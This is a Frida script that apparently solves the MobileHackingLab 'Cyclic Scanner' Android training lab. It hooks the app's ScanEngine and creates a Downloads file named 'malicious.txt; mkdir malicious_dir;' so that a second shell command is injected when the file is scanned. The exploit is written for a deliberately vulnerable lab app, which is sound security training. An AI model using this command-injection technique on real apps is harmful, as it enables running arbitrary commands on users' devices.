Java.perform(function () {
  function showToast(msg) {
    Java.scheduleOnMainThread(function () {
      var Toast = Java.use("android.widget.Toast");
      var String = Java.use("java.lang.String");
      var ActivityThread = Java.use("android.app.ActivityThread");
      var ctx = ActivityThread.currentApplication().getApplicationContext();
      Toast.makeText(ctx, String.$new(msg), Toast.LENGTH_LONG.value).show();
    });
  }

  var Environment = Java.use("android.os.Environment");
  var File = Java.use("java.io.File");
  var ScanEngine = Java.use("com.mobilehackinglab.cyclicscanner.scanner.ScanEngine");

  var companion = ScanEngine.Companion.value;

  var downloadsDir =
    Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS.value)
      .getAbsolutePath();

  var maliciousFileName = "malicious.txt; mkdir malicious_dir;";
  var maliciousFilePath = downloadsDir + "/" + maliciousFileName;

  var maliciousFile = File.$new(maliciousFilePath);
  var created = maliciousFile.createNewFile();

  if (created) {
    console.log("File created at: " + maliciousFilePath);

    var res = companion.scanFile.overload("java.io.File").call(companion, maliciousFile);
    console.log("[*] scanFile result: " + res);

    if (res) showToast("MobileHackingLabs Cyclic Scanner Lab done");
  } else {
    console.log("Failed to create malicious file.");
  }
});
